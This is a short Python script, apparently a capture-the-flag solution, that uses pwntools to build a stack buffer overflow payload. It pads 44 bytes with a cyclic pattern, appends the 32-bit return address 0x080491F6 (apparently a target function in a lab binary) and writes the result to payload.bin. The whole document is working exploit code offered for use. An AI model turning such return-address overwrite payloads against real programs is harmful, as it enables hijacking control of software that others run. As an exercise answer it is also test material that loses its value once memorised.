import pwn

payload = pwn.cyclic(44) + pwn.p32(0x080491F6) + b"\n"

with open("payload.bin", "wb") as f:
    f.write(payload)
